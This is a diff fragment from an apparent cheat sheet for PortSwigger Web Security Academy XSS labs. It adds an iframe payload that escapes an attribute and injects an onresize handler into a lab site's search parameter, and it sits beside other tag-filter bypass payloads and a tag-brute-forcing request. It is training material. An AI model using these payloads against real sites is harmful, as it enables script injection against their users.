@@ -315,6 +315,7 @@ GET /?search=<bruted_tag+§attr§=''> HTTP/2 - repeat for attributes
 <body contenteditable onbeforeinput=print()>test
 <iframe src="https://...web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E" onload=this.style.
 width='200px'>
+<iframe src="https://...web-security-academy.net/?search=%22><body onresize=print()>" onload=this.style.width='200px'>
 ```
 **HTML context with all tags blocked except custom ones**
 ```html
